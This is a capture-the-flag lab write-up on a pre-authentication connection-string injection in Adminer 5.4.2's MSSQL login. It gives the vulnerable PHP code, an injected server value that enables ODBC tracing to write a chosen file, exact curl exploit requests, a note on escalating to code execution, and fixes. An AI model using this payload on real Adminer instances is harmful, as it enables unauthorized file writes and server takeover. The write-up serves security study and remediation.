# Adminer MSSQL DSN TraceFile RCE

## What Is Happening

The challenge exposes a reference page at `/` and an unmodified Adminer 5.4.2 instance at `/adminer.php`.

The gate watches:

```text
/tmp/pwn.txt
```

It releases the flag once that file contains:

```text
flag
```

The deployment enables the MS SQL driver and confirms this runtime:

```text
pdo_sqlsrv
Microsoft ODBC Driver 18 for SQL Server
```

That matches the pre-auth MSSQL DSN injection issue in Adminer 5.4.2.

## Why It Happens

Adminer builds the MSSQL PDO DSN from the unauthenticated login form's server field.

The vulnerable source path is:

```php
attach($N,$V,$F){
    list($Nd,$Rg)=host_port($N);
    return $this->dsn("sqlsrv:Server=$Nd".($Rg?",$Rg":""),$V,$F);
}
```

`$N` comes from:

```text
auth[server]
```

For normal host strings, `host_port()` does not remove semicolon-delimited connection-string options. Therefore:

```text
127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1
```

is handed to PDO as:

```text
sqlsrv:Server=127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1
```

Microsoft ODBC treats semicolons as option separators. `TraceFile` selects a file path and `TraceOn=1` enables tracing. The driver writes connection metadata, including the submitted username, before the database login succeeds.

## Exact Test

Adminer's login flow stores the password in the PHP session and redirects to a driver-specific GET URL. Use a cookie jar and first initialize the session.

```bash
curl -s \
  -c /tmp/adminer-cookies.txt \
  -b /tmp/adminer-cookies.txt \
  https://target.example/adminer.php \
  >/tmp/adminer-login.html

curl -i -L \
  -c /tmp/adminer-cookies.txt \
  -b /tmp/adminer-cookies.txt \
  https://target.example/adminer.php \
  -d 'auth[driver]=mssql' \
  --data-urlencode 'auth[server]=127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1' \
  --data-urlencode 'auth[username]=flag' \
  --data-urlencode 'auth[password]=x' \
  --data-urlencode 'auth[db]='
```

The expected Adminer error is:

```text
SQLSTATE[HYT00]: [Microsoft][ODBC Driver 18 for SQL Server]Login timeout expired
```

This is useful evidence: the request reached the Microsoft ODBC driver. The SQL Server login does not need to succeed.

Check the gate:

```bash
curl -s -L https://target.example/ |
  rg -n 'Handshake|flag-card|pwnbox|received'
```

## Expected Signal

```text
Handshake received
flag value displayed by the lab gate
```

## Result Interpretation

Confirmed chain:

```text
Adminer login form
-> auth[server]
-> host_port()
-> sqlsrv:Server=$host DSN concatenation
-> Microsoft ODBC connection-string parser
-> TraceFile=/tmp/pwn.txt
-> trace contains username flag
-> gate releases flag
```

The first direct `curl -L` attempt failed because it did not reliably preserve the initialized Adminer login session across the redirect. The working request first fetched the login page and then reused the same cookie jar for the POST and redirected GET.

## Root Cause

The root cause is connection-string parser confusion. Adminer treats the server field as a host, but the downstream ODBC driver treats the same bytes as SQL Server connection-string syntax.

The dangerous delimiter is:

```text
;
```

Adminer should not pass unauthenticated raw input into DSN grammar without rejecting DSN metacharacters.

## Impact

In the lab, the impact is writing `/tmp/pwn.txt` with content containing `flag`, which releases the flag.

In a real deployment with the same preconditions, the primitive can become arbitrary file write as the PHP worker or ODBC process user. If a writable web root is available, this can be adapted to write a PHP file and achieve remote code execution.

## Fix

- Parse `auth[server]` as a strict hostname or IP plus optional numeric port.
- Reject semicolons and connection-string metacharacters before calling PDO.
- Keep host, port, and driver options separate.
- Prefer structured driver options over string-concatenated DSNs.
- Add negative tests for `TraceFile`, `TraceOn`, and semicolon-delimited MSSQL options.

## Key Lesson

When reviewing connection setup code, do not stop at application-level validation. Identify the final parser that consumes the string. A field named `server` can become a full connection-string language once it reaches a database driver.
